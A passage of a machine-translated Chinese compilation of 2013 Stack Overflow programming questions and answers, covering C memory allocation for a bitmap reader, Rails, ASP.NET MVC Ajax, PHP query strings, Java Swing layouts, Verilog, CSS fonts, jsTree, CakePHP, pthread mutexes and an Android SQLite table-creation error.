}INFO_HEADER;

typedef struct 
{
   unsigned char    b;
   unsigned char    g;
   unsigned char    r;        
}COLORMAP;

#pragma pack(pop)

int main()
{
      // Var decl.
  INFO_HEADER       *pHeader = NULL;
  FILE              *pImage;
  COLORMAP          **ppColors;
  /*...*/

/* File opened in read, binary mode, memory allocated for pHeader*/     

fread (pHeader, sizeof(INFO_HEADER), 1, pImage);  

/*Next block is actually problematic.. Posting 'as is' from my code*/
      ppColors = (COLORMAP**)malloc((pHeader -> height ) * sizeof(COLORMAP));
  for(i = 0 ; i < pHeader -> height ; i++)
     ppColors[i] = (COLORMAP*)malloc(pHeader -> width * sizeof(COLORMAP));
fseek(pImage, pHeader -> fileheader.dataoffset, SEEK_SET);
    for (i = 0 ; i < pHeader -> width ; i++) 
  {
      for (j = 0 ; j < pHeader -> height ; j++) 
      {
          fread(&b, sizeof(unsigned char), 1, pImage);
          fread(&g, sizeof(unsigned char), 1, pImage);
          fread(&r, sizeof(unsigned char), 1, pImage);

          ppColors[i][j].b = b;
          ppColors[i][j].g = g;
          ppColors[i][j].r = r; 

          printf("width = %d height = %d %d:\t", i, j,  cnt);
          printf("%d ", (int)ppColors[i][j].b);
          printf("%d ", (int)ppColors[i][j].g);
          printf("%d\n", (int)ppColors[i][j].r);
          cnt++;  
      }
  }

  /*And at last free()ing..*/
  for(i = 0 ; i < pHeader -> height ; i++)        free(ppColors[i]);
   free(ppColors);
  cleanup();
  return(0)
} 
```

**可能重复**：[http ://stackoverflow.com/questions/1568042/optimal-way-to-free-a-malloced-2d-array-in-c](http://stackoverflow.com/questions/1568042/optimal-way-to-free-a-malloced-2d-array-in-c)

虽然上面的链接无法解决我的问题。

1.  我的内存用完了。我对高度进行了 malloc() 处理，然后对于每个高度，宽度再次进行了 malloc() 处理。我正在尝试仅在宽度 X 高度域上工作。看来问题出在身高上。如果你改变

`ppColors = (COLORMAP**)malloc((pHeader -> height ) * sizeof(COLORMAP));`至 `ppColors = (COLORMAP**)malloc((pHeader -> height + 6 ) * sizeof(COLORMAP));`

然后这个问题就消失了。

2.  但是在 free()ing 时，我在核心转储中得到双重释放/损坏。

我该死的肯定我在某个地方出错了。我不希望有人纠正我的代码，我只是运行它。只是提示就可以了。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-17T13:12:47.237

指向指针的指针*与*数组数组不同。

当使用指针来模拟多维数组时，像这样声明：

```
char **pointer; 
```

内存看起来像这样：

```
+------------+------------+------+------ --+
| 指针[0] | 指针[1] | ... | 指针[大小 - 1] |
+------------+------------+------+------ --+
     | | |
     vvv
   数据 数据 数据

```

而一个合适的多维数组

```
char array[X][Y]; 
```

在内存中看起来像这样：

```
+-------------+-------------+------+--------------- --+-------------+------+
| 数组[0][0] | 数组[0][1] | ... | 数组[0][Y - 1] | 数组[1][0] | ... |
+-------------+-------------+------+--------------- --+-------------+------+

```

因此，在一个适当的多维数组中，所有内存都在一个块中，而使用指针到指针时，您有一个指针数组而不是数组数组。

* * *

所以你应该做的是分别分配所有子数组：

```
ppColors = malloc(pHeader->height * sizeof(COLORMAP *));
/* Note how I allocate the width times the size of a COLORMAP pointer */

for (int i = 0; i < pHeader->height; i++)
    ppColors[i] = malloc(pHeader->width * sizeof(COLORMAP)); 
```

不要忘记您现在也必须`free`循环调用！

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-17T13:11:48.630

我可以看到几个问题：

*   `ppColors`是一个指针数组。数组中的每个元素都是 a `COLORMAP*`，因此您需要使用 计算要分配的大小`numElements * sizeof(COLORMAP*)`。 `COLORMAP`只有 3 个字符，所以很可能`sizeof(COLORMAP*)`> `sizeof(COLORMAP)`。您当前的分配将太小，因此您最终会写到数组末尾之外；这具有未定义的影响，但可能会崩溃。
*   宽度和高度的使用在分配和循环之间是相反的，因此您最终会在循环中的某个点写入未分配的内存。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-17T13:17:07.130

This may not be an answer but probably help you along with other answers.

*   This might be problem with `fread` check what do you get in `pHeader -> height` and `pHeader -> width`

*   Use parenthesis around `pHeader -> width` in `malloc(pHeader -> width * sizeof(COLORMAP))`

# ruby-on-rails-3 - 带有文本和图像栏的 Button_to 3

> ID：14379773
> 
> 赞同：0
> 
> 时间：2013-01-17T13:04:42.733
> 
> 标签：ruby-on-rails-3, link-to, button-to

如何在 Rails3 中创建带有标签和图像的按钮？

此代码仅显示图像：

```
<%= link_to image_tag("newRevision.png"), {:controller => :review_transitions, :action => :show_step}, {:class => "navBtn"} %> 
```

但是...带有文字的图像？

```
<%= link_to "example_text"+image_tag("newRevision.png"), {:controller => :review_transitions, :action => :show_step}, {:class => "navBtn"} %> 
```

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-17T15:02:45.823

我认为可能是这样的

```
<%= link_to image_tag('image/someimage.png') + "Some text", some_path) %> 
```

# jquery - 使用 Ajax 渲染 MVC 视图

> ID：14379777
> 
> 赞同：-1
> 
> 时间：2013-01-17T13:04:52.250
> 
> 标签：jquery, ajax, asp.net-mvc-3, view, asp.net-mvc-4

我要完成的任务基本上涉及我使用 AJAX 调用 MVC 视图，并将视图的内容呈现到我的主要内容 div 中。我知道，由于我不会重新加载整个页面，只是刷新我需要的内容，我需要更改 URL 字符串以说明我尝试调用的任何控制器和操作，以获得所需的看法。到目前为止，我还没有做过很多 Ajax，因为我只是一名初级开发人员，但是我对学习如何实现诸如此类的事情以及随后的任何事情非常感兴趣。

我使用 C# 作为我的主要语言，并且可以使用 mvc3 或 mvc4，这是否有很大的不同，我不确定。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-17T13:38:34.497

您可以为此使用 Ajax.ActionLink ...

```
@Ajax.ActionLink("Click here", "OtherAction", null, new AjaxOptions() { UpdateTargetId = "MyDiv" })

<div id="MyDiv">

</div> 
```

**行动**

```
Public ActionResult OtherAction(long id)
{
    return View();
} 
```

**看法**

```
@{
    ViewBag.Title = "Hello!";
    Layout = Request.IsAjaxRequest() ? null : "~/Views/Shared/_Layout.cshtml";
}

<h1>Hello!</h1> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-17T13:14:01.647

Button: @supplierQuoteId is from the model via Razor.

```
<a id="@supplierQuoteId" class="t-button" style="float: right; margin: 3px; padding: 2px; line-height: 0;" 
    onclick="ajaxEditSupplierQuote(this.id)">
    <span class="t-icon t-edit">Edit</span>
</a> 
```

JavaScript: If $.ajax is complete, I open a Telerik Window and there is a .Content - div with the id="supplierquote-dialog-contet" which is then filled with the returned PartialView from the Controller, otherwise, i set .html(" ") . Empty.

```
<script type="text/javascript">        
    function ajaxEditSupplierQuote(id) {
        var strUrl = "/SupplierQuote/Edit" + "/" + id.toString();
        $.ajax({
            type: "GET",
            url: strUrl,
            dataType: "html",
            success: function (data) {
                if (!data) {
                    $('#supplierquote-dialog-content').html(" "); // error check
                }
                else {
                    $('#supplierquote-dialog-content').html(data);
                }
            },
            complete: function () {
                var window = $("#SupplierQuoteDialog").data("tWindow");
                window.center().open();
            }
        });
    }
</script> 
```

SupplierQuoteController:

```
 [HttpGet]
    public ActionResult Edit(Guid id)
    {
        SupplierQuoteEntity supplierQuote = _supplierQuoteRepository.GetById(id);
        return PartialView("Edit", supplierQuote);
    } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-17T13:16:20.290

看看这个问题，和你的很相似。

[ASP.NET MVC - 将 PartialView 与另一个对象一起返回给 Ajax](https://stackoverflow.com/questions/10589787/asp-net-mvc-returning-a-partialview-to-ajax-along-with-another-object)

从那里窃取一些代码，您可以执行以下操作：

```
public ActionResult GetSomePartialView(SomeArgumentModel someArguments)
{
    ReturnArgs r = new ReturnArgs();

    r.ViewString = this.RenderViewToString("SomeView");

    return Json(r);
}

public class ReturnArgs
{
    public ReturnArgs()
    {
    }

    public string ViewString { get; set; }
} 
```

然后在视图中：

```
$.ajax({
    type: "GET",
    url: "/Home/GetSomePartialView/",
    data: someArguments,
    success: function (jsReturnArgs) { 

    $("#someDiv").html(jsReturnArgs.ViewString); //the HTML I returned from the controller
    },
    error: function (errorData) { onError(errorData); }
}); 
```

# php - php 中的 $_GET 变量而不使用表单

> ID：14379778
> 
> 赞同：0
> 
> 时间：2013-01-17T13:04:53.310
> 
> 标签：php

我在gallery.php 页面中有gallery.php?gid=1，我必须在不使用表单的情况下将数据提交到save.php。

我想在不使用按钮的情况下获得 gid 的值..

那可能吗？

画廊.php

$gid=$_GET['gid'];

保存.php

回声 $gid..

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-17T13:09:28.617

$_GET 将包含 URL 中“？”之后的所有变量。(foo.php?gid=...)。

您没有义务使用表格来填写这些变量。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-17T13:07:35.807

```
header("location:save.php?gid=".$gid); 
```

或者

使用锚标签`href="save.php?gid=<?php echo $gid;?>"`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-17T13:11:11.100

`$_GET`数组的成员 来自**查询字符串**。简单来说，**查询字符串**是`?`URL 字符之后的一部分，格式如下：

```
param1=value1&param2=value2&.... 
```

因此，您可以通过将查询字符串添加到此 PHP 文件 URL 的末尾来将任何键值对传递到您的 PHP 脚本。

# java - 是否可以强制 JButton 始终为方形？

> ID：14379781
> 
> 赞同：4
> 
> 时间：2013-01-17T13:05:00.997
> 
> 标签：java, swing, layout, jbutton, layout-manager

我正在编写一个扫雷克隆，我现在遇到的问题是我的网格上按钮的比例 - 我想让用户随意调整窗口的大小，但我希望按钮保持相同的 1:1在某些情况下，宽度/高度比而不是成为煎饼或监狱吧:) 有没有办法轻松地强制 JButton 始终保持方形而不给它固定的宽度和高度？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-01-17T13:09:01.350

您可以编写自定义`LayoutManager`扩展`GridLayout`名并设置子项大小。

```
import javax.swing.*;
import java.awt.*;

public class SquareButtonsTestApp extends JFrame {

    public static void main ( String[] args ) {
        new SquareButtonsTestApp();
    }

    public SquareButtonsTestApp() {
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        getContentPane().setLayout(new MyGridLayout(10, 20));
        for (int i=0; i<10; i++) {
            for (int j=0; j<20; j++) {
                getContentPane().add(new JButton(" "));
            }
        }
        setSize(800,600);
        setLocationRelativeTo(null);
        setVisible(true);
    }

    class MyGridLayout extends GridLayout {
        public MyGridLayout(int rows, int cols) {
            super(rows, cols);
        }
        public void layoutContainer(Container parent) {
            synchronized (parent.getTreeLock()) {
                Insets insets = parent.getInsets();
                int ncomponents = parent.getComponentCount();
                int nrows = getRows();
                int ncols = getColumns();
                boolean ltr = parent.getComponentOrientation().isLeftToRight();

                if (ncomponents == 0) {
                    return;
                }
                if (nrows > 0) {
                    ncols = (ncomponents + nrows - 1) / nrows;
                } else {
                    nrows = (ncomponents + ncols - 1) / ncols;
                }
                // 4370316\. To position components in the center we should:
                // 1\. get an amount of extra space within Container
                // 2\. incorporate half of that value to the left/top position
                // Note that we use trancating division for widthOnComponent
                // The reminder goes to extraWidthAvailable
                int totalGapsWidth = (ncols - 1) * getHgap();
                int widthWOInsets = parent.getWidth() - (insets.left + insets.right);
                int widthOnComponent = (widthWOInsets - totalGapsWidth) / ncols;
                int extraWidthAvailable = (widthWOInsets - (widthOnComponent * ncols + totalGapsWidth)) / 2;

                int totalGapsHeight = (nrows - 1) * getVgap();
                int heightWOInsets = parent.getHeight() - (insets.top + insets.bottom);
                int heightOnComponent = (heightWOInsets - totalGapsHeight) / nrows;
                int extraHeightAvailable = (heightWOInsets - (heightOnComponent * nrows + totalGapsHeight)) / 2;

                int size=Math.min(widthOnComponent, heightOnComponent);
                widthOnComponent=size;
                heightOnComponent=size;
                if (ltr) {
                    for (int c = 0, x = insets.left + extraWidthAvailable; c < ncols ; c++, x += widthOnComponent + getHgap()) {
                        for (int r = 0, y = insets.top + extraHeightAvailable; r < nrows ; r++, y += heightOnComponent + getVgap()) {
                            int i = r * ncols + c;
                            if (i < ncomponents) {
                                parent.getComponent(i).setBounds(x, y, widthOnComponent, heightOnComponent);
                            }
                        }
                    }
                } else {
                    for (int c = 0, x = (parent.getWidth() - insets.right - widthOnComponent) - extraWidthAvailable; c < ncols ; c++, x -= widthOnComponent + getHgap()) {
                        for (int r = 0, y = insets.top + extraHeightAvailable; r < nrows ; r++, y += heightOnComponent + getVgap()) {
                            int i = r * ncols + c;
                            if (i < ncomponents) {
                                parent.getComponent(i).setBounds(x, y, widthOnComponent, heightOnComponent);
                            }
                        }
                    }
                }
            }
        }
    }
} 
```

# android - Android，libgdx，声音问题

> ID：14379784
> 
> 赞同：0
> 
> 时间：2013-01-17T13:05:12.030
> 
> 标签：android, audio

我正在尝试使用 gdx lib 在我的游戏中播放声音。

请参阅下面我的代码：

```
Sound sound = Gdx.audio.newSound(Gdx.files.internal(Assets.SOUND_DIR_PATH + "test.wav"));
sound.play(0.75f); 
```

当我在 sound.play() 线上使用断点进行调试时它工作正常，但当我不调试时它不起作用......

任何帮助将不胜感激 ！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-18T16:49:20.153

尝试只输入文件名，像这样

```
Sound sound = Gdx.audio.newSound(Gdx.files.internal("test.wav"));
sound.play(0.75f); 
```

这样对我来说很好。

# verilog - 半色调像素转换器输出未定义

> ID：14379787
> 
> 赞同：3
> 
> 时间：2013-01-17T13:05:14.527
> 
> 标签：verilog

我正在编写 Verilog 代码以使用 Floyd-Stiengburg 算法将 8 位像素转换为半色调像素。下面是将**6 个**像素（8 位）转换为半色调像素的代码。我已经在 Modelsim 上成功编译了这段代码，但是在仿真中，输出（半色调像素值）是 XXXXXX（未定义）。

```
 module half_tone(pixel,htpv);
  input [0:47]pixel;
  output reg [1:6]htpv;
  reg [8:1]error[1:6];
  reg [8:1]pixel_1;
  reg [9:0]cpv,cpv_round,e_av;
  parameter threshold =128;
  integer i=1;
  initial
   begin
   error[0]=8'b00;
   for(i=0;i<6;i=i+1)
   begin
   e_av=(2*error[i])>>4;
   cpv=pixel[(i*8)+:8]+e_av;
   cpv_round=(cpv<threshold)?0:255;
   htpv[i]=(cpv_round==0)?0:1;
   error[i]=cpv-cpv_round;
   #10;
   end
 end
 endmodule 
```

我无法弄清楚为什么输出是 XXXXXX（未定义）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-17T13:48:40.360

当我使用 Incisive 模拟器编译您的代码时，我收到了以下警告消息：

```
 error[0]=8'b00;
       |
ncelab: *W,BNDMEM (./half_tone.v,11|7): Memory index out of declared bounds [4.2.2(IEEE)]. 
```

您需要`error`正确初始化。也许`error[1]=8'b00;`？

# css - 字体系列没有加载？

> ID：14379788
> 
> 赞同：8
> 
> 时间：2013-01-17T13:05:18.553
> 
> 标签：css

我有以下 CSS 声明：

```
body {font-family: Verdana, Tahoma, "Trebuchet MS", "DejuVu Sans", "Bitstream Vera Sans", sans-serif; 
```

它没有加载到页面上。我不得不补充：

```
 <style>
body {font-family: Verdana, Tahoma, "Trebuchet MS", "DejuVu Sans", "Bitstream Vera Sans", sans-serif;}
</style> 
```

到 HTML 让它工作......这在 chrome 和 safari 中是真的......这很奇怪，想法？

请注意，所有其他 CSS 工作正常...

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-01-17T13:06:09.370

您是否尝试选择以下？

```
body, body * {
    font-family: Verdana, Tahoma, "Trebuchet MS", "DejuVu Sans", "Bitstream Vera Sans", sans-serif;
} /* this affects every element in the body and the body itself */

/* OR just */
* {
    font-family: Verdana, Tahoma, "Trebuchet MS", "DejuVu Sans", "Bitstream Vera Sans", sans-serif;
} /* this affects every element */ 
```

这是您可以使用 CSS3 执行的操作： [http ://www.css3.info/preview/web-fonts-with-font-face/](http://www.css3.info/preview/web-fonts-with-font-face/)

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2013-01-17T16:03:58.393

所以， !important 起作用了，我不知道为什么。一张便条，我取出了额外的家庭，现在看起来像这样：

```
body, body * {
font-family: Verdana, Tahoma, sans-serif !important;
} 
```

但改变它与修复它无关。!important 修复了它。即使在 CSS 中的任何其他位置没有任何其他更改字体系列（请参阅工作中的 JS Fiddle）。我附上了开发者工具的截图来展示继承。

![开发者工具](../Images/d3547fd635e7106639fe823474f0a52d.png)

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-01-17T13:33:30.740

必须使用`font-face启​​用一些字体系列，通常你会做这样的事情

```
@font-face {
    font-family: 'alex_brushregular';
    src: url('alexbrush-regular-otf-webfont.eot');
    src: url('alexbrush-regular-otf-webfont.eot?#iefix') format('embedded-opentype'),
         url('alexbrush-regular-otf-webfont.woff') format('woff'),
         url('alexbrush-regular-otf-webfont.ttf') format('truetype');
    font-weight: normal;
    font-style: normal;

}

body {

font-family: 'alex_brushregular', Arial, "sans-serif";

} 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2020-07-30T12:25:01.283

这是一篇旧帖子，但如果人们遇到同样的问题并最终出现在这里，我建议您确保您的 css 文件中没有错误（最简单的检查方法是注释掉除字体系列或将 css 文件替换为仅具有字体系列设置的文件）。我只是遇到了同样的问题并找到了原因，经过数小时的挫折和谷歌搜索没有解决方案（这就是我来这篇文章的原因；添加重要！对我不起作用），是我的 css 文件中的一个错误，所以浏览器跳过了一些设置，包括字体系列。尽管原始帖子中显示的 css 文本没有错误，但真正的 css 文件中可能存在错误。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-01-17T13:16:29.033

**只需尝试以下示例：**

```
@font-face{font-family:'Arvo';src:url('fonts/Arvo-Regular.ttf')}
@font-face{font-family:'Erasmd';src:url('fonts/ERASMD.TTF')}

body { font-family: Arvo; }

(or)

body { font-family: Verdana, Geneva, Arial, Helvetica, sans-serif !important; } 
```

我认为这可以帮助您解决问题。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2020-11-08T20:31:42.437

如果您的浏览器使用的是 CSS 文件的缓存版本，也会发生类似的情况。

`CTRL`在这种情况下，使用+的“硬刷新”`F5`可能会有所帮助，如此[处](https://stackoverflow.com/q/7768459)和[此处](https://stackoverflow.com/q/52682812)以及[Firefox 文档](https://support.mozilla.org/en-US/kb/keyboard-shortcuts-perform-firefox-tasks-quickly#w_navigation)中所建议的那样。

# javascript - jsTree drag_check 不工作

> ID：14379790
> 
> 赞同：0
> 
> 时间：2013-01-17T13:05:32.013
> 
> 标签：javascript, jquery, drag-and-drop, treeview, jstree

我有一个 jsTree 使用 dnd 插件来允许拖放树项以更改它们的位置。但是我注意到索引是错误的，这取决于您是在对象之前还是之后删除项目，并且在谷歌搜索了几个小时关于如何解决索引问题之后，我得出的结论是禁用之后会更容易除非它是子集的最后一个树节点

我正在使用以下代码来调用配置 dnd 插件：

```
 'dnd': {
        'drop_finish': function (data) {
            alert("hi");
        },
        'drag_check': function (data) {
            alert('hi1');
            if (data.r.attr('id') == 'RootNode') {
                return false;
            } else if (data.r.hasClass('jstree-last')) {
                return {
                    after: true,
                    before: true,
                    inside: true
                };
            } else {
                return {
                    after: false,
                    before: true,
                    inside: true
                };
            }
        }
    } 
```

但是，`hi1`永远不会收到警报（但是`hi`在我丢弃该项目之后会发出警报），所以我仍然可以在元素之后丢弃。我已经尝试找出如何调用拖动检查，并尝试了很多事情，比如添加`jstree-drop`类和其他在这个网站上建议的东西，但我就是无法得到`hi1`警报。

任何帮助将不胜感激解决这个问题

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T10:59:02.130

看起来“dnd”插件用于外部拖放。您可以使用`check_move`来防止移动到节点中的最后一个位置：

```
"crrm": {
    "move": {
        "check_move": function(m) {
        var length = $(m.np).find("ul:first > li").length,
            afterLast = length == m.cp;
        if (length > 0 && afterLast) {
            return false;
        }
        return true;                            
     }
 } 
```

# android - 使用谷歌分析跟踪子域

> ID：14379794
> 
> 赞同：0
> 
> 时间：2013-01-17T13:05:44.567
> 
> 标签：android, google-analytics

为了将统计信息与具有不同外形的设备分开，我想合并子域跟踪 - Android GA SDK 上是否有任何相关功能？

PS 如果我没记错的话，这个功能是在 JS API 使用者中使用 setDomainName 方法访问的。

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-17T13:14:59.830

为什么不直接使用 Google Analytics 中的高级细分，它将所有内容保存在同一个配置文件中，而是让您使用细分来过滤报告中所需的数据？

例如，您可以创建一个段来过滤某个字符串的所有用户代理：

`INCLUDE` `BROWSER` `MATCHING REGEXP` `^(Your_custom_user_agent)$`

# cakephp - 用于 habtm 的 CakePHP 2.1 分页

> ID：14379795
> 
> 赞同：0
> 
> 时间：2013-01-17T13:05:45.383
> 
> 标签：cakephp, cakephp-2.1, has-and-belongs-to-many, pagination

我正在使用 cakephp 2.1 并开发一个应用程序，其中包含以下表结构。

```
1\. people(id, name)
2\. movies(id, name) 
```

和“人物”`habtm`电影的表格如下。

```
1\. castsmovie(id, person_id, movie_id)
2\. directorsmovie(id, person_id, movie_id)
3\. moviesmusicdirector(id, person_id, movie_id)
4\. moviesproducers(id, person_id, movie_id)
5\. movieswriter(id, person_id, movie_id)
6\. cinematographersmovie(id, person_id, movie_id) 
```

我想为特定的人获取电影并为他分页电影。所以我写的代码在控制器中

```
$this->paginate = array('Person' => array(
        'contain' => array(
                'CastsMovie' => array('Movie'),
                'DirectorsMovie' => array('Movie'),
                'MoviesProducer' => array('Movie'),
                'MoviesMusicDirector' => array('Movie')),
                'MoviesWriter' => array('Movie'),
                'CinematographersMovie' => array('Movie')
        ),
        'conditions' => array('Person.id' => $id))); 
```

结果如下

```
 array(
(int) 0 => array(
    'Person' => array(
        'id' => '101',
        'name' => 'Darshan Thoogudeep',
    ),
    'CastsMovie' => array(
        (int) 0 => array(
            'id' => '53',
            'movie_id' => '14',
            'person_id' => '101',
            'order' => '1',
            'Movie' => array(
                'id' => '14',
                'name' => 'Krantiveera Sangolli Rayanna',
            )
        ),
        (int) 1 => array(
            'id' => '78',
            'movie_id' => '19',
            'person_id' => '101',
            'order' => '0',
            'Movie' => array(
                'id' => '19',
                'name' => 'Saarathi',
            )
        ),
        (int) 2 => array(
            'id' => '137',
            'movie_id' => '35',
            'person_id' => '101',
            'order' => '1',
            'Movie' => array(
                'id' => '35',
                'name' => 'BulBul',
            )
        ),
        (int) 3 => array(
            'id' => '153',
            'movie_id' => '42',
            'person_id' => '101',
            'order' => '0',
            'Movie' => array(
                'id' => '42',
                'name' => 'Viraat',
            )
        )
    ),
    'CinematographersMovie' => array(),
    'DirectorsMovie' => array(),
    'MoviesMusicDirector' => array(),
    'MoviesWriter' => array(),
    'MoviesProducer' => array()
)
 ) 
```

但我想获取限制为 20 的特定人的所有电影。这样我就可以轻松地对每页中电影的限制进行分页。请帮我解决问题。工作更受赞赏。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-17T13:09:49.043

我建议更改您的数据模型，以便您只有一个 HABTM 表：

```
people_movies(id, person_id, movie_id,role_id) 
```

您还需要一个角色表：

```
role(id, role_name) 
```

然后，您可以将它们全部存储在同一个表中，并在将来根据需要添加其他角色。

使用这种方法，获取一个人的所有电影的查询会简单得多。

# pthreads - 互斥锁适用于代码段或代码段中的变量？

> ID：14379800
> 
> 赞同：0
> 
> 时间：2013-01-17T13:05:59.283
> 
> 标签：pthreads, mutex

我对互斥锁适用于代码段或代码段中的变量感到困惑。

在下面的示例中，互斥锁将阻止两个线程同时尝试从 func1 或 func2 访问 mysum，或者仅保护互斥锁锁定和解锁之间的代码段

```
 .
   .
     pthread_mutex_t myMutex;
     int mysum;

  void func1(){
  .
  .
  .

  pthread_mutex_lock (&myMutex);
     mysum--;
     printf("Thread %ld did mysum=%d\n",id,mysum);
  pthread_mutex_unlock (&myMutex);
  .
  .
  }

  void func2(){
  .
  .
  .
  mysum++;

  pthread_mutex_lock (&myMutex);
     mysum++;
     printf("Thread %ld did mysum=%d\n",id,mysum);
  pthread_mutex_unlock (&myMutex);
  .
  .
  }

  int main (int argc, char *argv[])
  {
    pthread_mutex_init(&myMutex, NULL);
  .
  .

    pthread_create(&callThd1, &attr, func1, NULL); 

    pthread_create(&callThd2, &attr, func2, NULL); 
      pthread_create(&callThd3, &attr, func1, NULL); 

    pthread_create(&callThd4, &attr, func2, NULL); 
    pthread_create(&callThd5, &attr, func1, NULL); 

    pthread_create(&callThd6, &attr, func2, NULL); 
  .
  .

    pthread_mutex_destroy(&myMutex);
  .
  .

  } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-18T05:56:08.157

互斥锁只提供位于`pthread_mutex_lock()`和之间的代码段之间的互斥`pthread_mutex_unlock()`（这些被称为*临界段*）。

互斥锁和它所保护的共享数据之间没有直接的联系 - 由您来确保您只访问锁定了相应互斥锁的共享数据。

# android - 智能手机和平板电脑的 Android 片段处理？

> ID：14379808
> 
> 赞同：1
> 
> 时间：2013-01-17T13:06:27.130
> 
> 标签：android

我需要在我的 android 示例应用程序中实现 Fragmentation 概念。如果设备是智能手机，那么当我单击按钮时，它应该在另一个窗口中显示结果，如果是平板电脑，那么它应该在同一窗口中显示结果。但我不知道该怎么做。我得到了一些参考代码，但它适用于平板电脑而不是智能手机。当我尝试运行同一个项目时，它会给出强制关闭错误。所以任何人有一个想法请帮助我。

接受任何建议。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-17T13:13:47.187

强烈推荐[这个](http://mobile.tutsplus.com/tutorials/android/android-sdk_fragments/)教程，它完美地描述了这个概念，并提供了一个非常清晰和简单的例子来在你的应用程序中实现片段。希望这对您有所帮助。

# android - android：在sqlite中创建表时出错？

> ID：14379812
> 
> 赞同：-3
> 
> 时间：2013-01-17T13:07:07.713
> 
> 标签：android, sqlite

我在 android 中创建了应用程序，我执行 crud 操作。在应用程序中数据库文件已成功创建，但在创建表期间出错，以下是 Logcat 错误和数据库适配器类。

**Logcat 错误**

```
01-17 13:03:59.139: E/SQLiteLog(1036): (1) table timerecordsnew1 has no column named note
01-17 13:03:59.309: E/SQLiteDatabase(1036): Error inserting note=asdfsdfadf
01-17 13:03:59.309: E/SQLiteDatabase(1036): android.database.sqlite.SQLiteException: table timerecordsnew1 has no column named note (code 1): , while compiling: INSERT INTO timerecordsnew1(note) VALUES (?)
01-17 13:03:59.309: E/SQLiteDatabase(1036):     at android.database.sqlite.SQLiteConnection.nativePrepareStatement(Native Method) 
```

以下是我的**数据库适配器类**

```
public class TimeTrackerAdapter {

    private static final int DATABASE_VERSION = 4;
    private static final String DATABASE_NAME = "timetrackernew1.db";
    //Table
    private static final String TABLE_NAME = "timerecordsnew1";

    //Table Column Variable
    public static final String TIMERECORDS_COLUMN_ID = "id";
    public static final String TIMERECORDS_COLUMN_TIME = "time";
    public static final String TIMERECORDS_COLUMN_NOTE = "note";

    private TimeTrackerOpenHelper openHelper;
    private SQLiteDatabase sqlDb;

    //Database creation sql statement
    private static final String SQL_CREATE_ENTRIES = "CREATE TABLE " +  
            TABLE_NAME + "(" + TIMERECORDS_COLUMN_ID + " INTEGER PRIMARY KEY AUTOINCREMENT, " + 
            TIMERECORDS_COLUMN_TIME + " TEXT " + TIMERECORDS_COLUMN_NOTE + " TEXT);";

    public TimeTrackerAdapter(Context context) {
        openHelper = new TimeTrackerOpenHelper(context);
        sqlDb = openHelper.getWritableDatabase();
    }

    //to insert data into database
    public void saveRecords(String t, String n) {

        ContentValues contentValues = new ContentValues();
        contentValues.put(TIMERECORDS_COLUMN_NOTE,t);
        contentValues.put(TIMERECORDS_COLUMN_NOTE, n);

        sqlDb.insert(TABLE_NAME, null, contentValues);
    }
    //get fetch the all data
    public Cursor getAllRecords() {

        return sqlDb.rawQuery("select * from " + TABLE_NAME, null);

    }

    // inner class
    private class TimeTrackerOpenHelper extends SQLiteOpenHelper {

        public TimeTrackerOpenHelper(Context context) {
            super(context, DATABASE_NAME, null, DATABASE_VERSION);
            // TODO Auto-generated constructor stub

        }

        @Override
        public void onCreate(SQLiteDatabase db) {
            // TODO Auto-generated method stub
            System.out.println("create statement"+SQL_CREATE_ENTRIES);
            try
            {
                db.execSQL(SQL_CREATE_ENTRIES);

            }catch(SQLiteException sql)
            {
                sql.printStackTrace();
            }
        }

        @Override
        public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
            // TODO Auto-generated method stub
            db.execSQL("DROP TABLE IF EXISTS " + TABLE_NAME);
            onCreate(db);
        }
    }

} 
```

请任何人帮我解决这个错误。

感谢您

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-17T13:09:24.463

您在两列之间的 SQL 中遗漏了一个逗号：

```
private static final String SQL_CREATE_ENTRIES = "CREATE TABLE " +  
        TABLE_NAME + "(" + TIMERECORDS_COLUMN_ID + " INTEGER PRIMARY KEY AUTOINCREMENT, " + 
        TIMERECORDS_COLUMN_TIME + " TEXT **,%Comma goes here%** " + TIMERECORDS_COLUMN_NOTE + " TEXT);"; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-17T13:09:46.653

`TIMERECORDS_COLUMN_TIME + " TEXT "` == `TIMERECORDS_COLUMN_TIME + " TEXT, "`

你忘记了“，”字符。

下次阅读异常并更准确地查看您的代码。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-17T13:13:01.840

看起来您在`create table`DDL 中缺少逗号。（在`TIMERECORDS_COLUMN_TIME`专栏..

从：

```
 private static final String SQL_CREATE_ENTRIES = 
        "CREATE TABLE " + TABLE_NAME + "(" + 
           TIMERECORDS_COLUMN_ID + " INTEGER PRIMARY KEY AUTOINCREMENT, " + 
           TIMERECORDS_COLUMN_TIME + " TEXT " + 
           TIMERECORDS_COLUMN_NOTE + " TEXT);"; 
```

至

```
 private static final String SQL_CREATE_ENTRIES = 
